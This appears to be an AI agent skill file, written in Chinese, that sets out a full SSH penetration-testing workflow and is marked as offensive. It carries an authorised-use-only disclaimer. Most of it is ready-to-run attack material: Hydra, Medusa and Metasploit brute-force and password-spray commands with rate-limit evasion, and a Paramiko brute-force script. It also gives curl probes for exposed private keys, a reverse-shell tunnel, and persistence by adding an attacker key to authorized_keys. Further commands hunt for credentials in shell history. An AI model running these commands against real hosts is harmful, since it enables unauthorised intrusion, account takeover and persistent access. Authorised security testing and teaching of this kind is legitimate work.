---
name: ssh-penetration-testing
description: "执行全面的 SSH 安全评估，包括枚举、凭据攻击、漏洞利用、隧道技术和后渗透活动。本技能涵盖测试 SSH 服务安全性的完整方法论。触发词：SSH渗透、SSH安全、SSH枚举、凭据爆破、SSH隧道、端口转发、SSH后渗透"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控的教育环境。

# SSH 渗透测试

## 目的

执行全面的 SSH 安全评估，包括枚举、凭据攻击、漏洞利用、隧道技术和后渗透活动。本技能涵盖测试 SSH 服务安全性的完整方法论。

## 前置条件

### 必需工具
- 带有 SSH 脚本的 Nmap
- Hydra 或 Medusa 用于暴力破解
- ssh-audit 用于配置分析
- Metasploit Framework
- 带有 Paramiko 库的 Python

### 必需知识
- SSH 协议基础
- 公钥/私钥认证
- 端口转发概念
- Linux 命令行熟练操作

## 输出与交付物

1. **SSH 枚举报告** - 版本、算法、配置
2. **凭据评估** - 弱密码、默认凭据
3. **漏洞评估** - 已知 CVE、配置错误
4. **隧道文档** - 端口转发配置

## 核心工作流

### 阶段 1：SSH 服务发现

识别目标网络上的 SSH 服务：

```bash
# 快速 SSH 端口扫描
nmap -p 22 192.168.1.0/24 --open

# 常见的 SSH 备用端口
nmap -p 22,2222,22222,2200 192.168.1.100

# 全端口扫描查找 SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# 服务版本检测
nmap -sV -p 22 192.168.1.100
```

### 阶段 2：SSH 枚举

收集 SSH 服务的详细信息：

```bash
# Banner 抓取
nc 192.168.1.100 22
# 输出：SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet Banner 抓取
telnet 192.168.1.100 22

# Nmap 版本检测与脚本
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# 枚举支持的算法
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# 获取主机密钥
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# 检查认证方法
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### 阶段 3：SSH 配置审计

识别弱配置：

```bash
# ssh-audit - 综合 SSH 审计
ssh-audit 192.168.1.100

# 指定端口的 ssh-audit
ssh-audit -p 2222 192.168.1.100

# 输出包括：
# - 算法推荐
# - 安全漏洞
# - 加固建议
```

需要识别的关键配置弱点：
- 弱密钥交换算法（diffie-hellman-group1-sha1）
- 弱加密算法（arcfour、3des-cbc）
- 弱 MAC 算法（hmac-md5、hmac-sha1-96）
- 已弃用的协议版本

### 阶段 4：凭据攻击

#### 使用 Hydra 暴力破解

```bash
# 单用户名，密码字典
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 用户名字典，单密码
hydra -L users.txt -p Password123 ssh://192.168.1.100

# 用户名和密码字典
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# 指定端口
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# 规避速率限制（慢速模式）
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# 详细输出
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# 首次成功后退出
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### 使用 Medusa 暴力破解

```bash
# 基本暴力破解
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# 多目标
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# 使用用户名字典
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# 指定端口
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### 密码喷洒

```bash
# 对多个用户测试常见密码
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# 多个常见密码
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### 阶段 5：基于密钥的认证测试

测试弱密钥或暴露的密钥：

```bash
# 使用找到的私钥尝试登录
ssh -i id_rsa user@192.168.1.100

# 显式指定密钥（绕过 agent）
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# 强制使用密码认证
ssh -o PreferredAuthentications=password user@192.168.1.100

# 尝试常见密钥名称
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

检查暴露的密钥：

```bash
# 私钥的常见位置
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Web 可访问的密钥（使用 curl/wget 检查）
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```

### 阶段 6：漏洞利用

搜索已知漏洞：

```bash
# 搜索漏洞利用
searchsploit openssh
searchsploit openssh 7.2

# 常见 SSH 漏洞
# CVE-2018-15473 - 用户名枚举
# CVE-2016-0777 - 漫游漏洞
# CVE-2016-0778 - 缓冲区溢出

# Metasploit 枚举
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

# 用户名枚举（CVE-2018-15473）
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/users.txt
run
```

### 阶段 7：SSH 隧道与端口转发

#### 本地端口转发

将本地端口转发到远程服务：

```bash
# 语法：ssh -L <本地端口>:<远程主机>:<远程端口> user@ssh服务器

# 通过 SSH 访问内部 Web 服务器
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
# 现在可以访问 http://localhost:8080

# 访问内部数据库
ssh -L 3306:192.168.1.50:3306 user@192.168.1.100

# 多个转发
ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
```

#### 远程端口转发

将本地服务暴露给远程网络：

```bash
# 语法：ssh -R <远程端口>:<本地主机>:<本地端口> user@ssh服务器

# 将本地 Web 服务器暴露给远程
ssh -R 8080:localhost:80 user@192.168.1.100
# 远程可通过 localhost:8080 访问

# 反向 Shell 回连
ssh -R 4444:localhost:4444 user@192.168.1.100
```

#### 动态端口转发（SOCKS 代理）

创建 SOCKS 代理用于网络跳转：

```bash
# 在本地端口 1080 创建 SOCKS 代理
ssh -D 1080 user@192.168.1.100

# 配合 proxychains 使用
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# 浏览器配置
# 将 SOCKS 代理设置为 localhost:1080
```

#### ProxyJump（跳板机）

通过多台 SSH 服务器链式跳转：

```bash
# 通过中间主机跳转
ssh -J user1@jump_host user2@target_host

# 多级跳转
ssh -J user1@jump1,user2@jump2 user3@target

# 使用 SSH 配置
# ~/.ssh/config
Host target
    HostName 192.168.2.50
    User admin
    ProxyJump user@192.168.1.100
```

### 阶段 8：后渗透

获得 SSH 访问后的活动：

```bash
# 检查 sudo 权限
sudo -l

# 查找 SSH 密钥
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# 检查 SSH 目录
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# 添加持久化（添加你的密钥）
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# 提取 SSH 配置
cat /etc/ssh/sshd_config

# 查找其他用户
cat /etc/passwd | grep -v nologin
ls /home/

# 从历史记录中查找凭据
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

### 阶段 9：使用 Paramiko 编写自定义 SSH 脚本

基于 Python 的 SSH 自动化：

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """使用凭据尝试 SSH 连接"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] 成功：{username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] 失败：{username}:{password}")
        return None
    except Exception as e:
        print(f"[!] 错误：{e}")
        return None

def execute_command(client, command):
    """通过 SSH 执行命令"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """使用字典进行 SSH 暴力破解"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # 运行后渗透命令
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# 使用示例
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"
    
    # 单凭据测试
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```

### 阶段 10：Metasploit SSH 模块

使用 Metasploit 进行综合 SSH 测试：

```bash
# 启动 Metasploit
msfconsole

# SSH 版本扫描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH 登录暴力破解
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# SSH 密钥登录
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# 用户名枚举
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# SSH 会话后渗透
sessions -i 1
```

## 快速参考

### SSH 枚举命令

| 命令 | 用途 |
|------|------|
| `nc <host> 22` | Banner 抓取 |
| `ssh-audit <host>` | 配置审计 |
| `nmap --script ssh*` | SSH NSE 脚本 |
| `searchsploit openssh` | 查找漏洞利用 |

### 暴力破解选项

| 工具 | 命令 |
|------|------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

### 端口转发类型

| 类型 | 命令 | 用途 |
|------|------|------|
| 本地 | `-L 8080:target:80` | 本地访问远程服务 |
| 远程 | `-R 8080:localhost:80` | 远程暴露本地服务 |
| 动态 | `-D 1080` | SOCKS 代理用于跳转 |

### 常见 SSH 端口

| 端口 | 描述 |
|------|------|
| 22 | 默认 SSH |
| 2222 | 常见备用端口 |
| 22222 | 另一个备用端口 |
| 830 | 基于 SSH 的 NETCONF |

## 约束与限制

### 法律考量
- 始终获取书面授权
- 暴力破解可能违反服务条款
- 记录所有测试活动

### 技术限制
- 速率限制可能阻止攻击
- Fail2ban 或类似工具可能封禁 IP
- 基于密钥的认证可防止密码攻击
- 双因素认证增加复杂性

### 规避技术
- 使用慢速暴力破解：`-t 1 -w 5`
- 跨多个 IP 分散攻击
- 谨慎使用基于时间的枚举
- 尊重锁定阈值

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| 连接被拒绝 | 验证 SSH 是否运行；检查防火墙；确认端口；从不同 IP 测试 |
| 认证失败 | 验证用户名；检查密码策略；密钥权限（600）；authorized_keys 格式 |
| 隧道不工作 | 检查 sshd_config 中的 GatewayPorts/AllowTcpForwarding；验证防火墙；使用 `ssh -v` |

## 适用场景
本技能适用于执行概述中描述的工作流或操作。
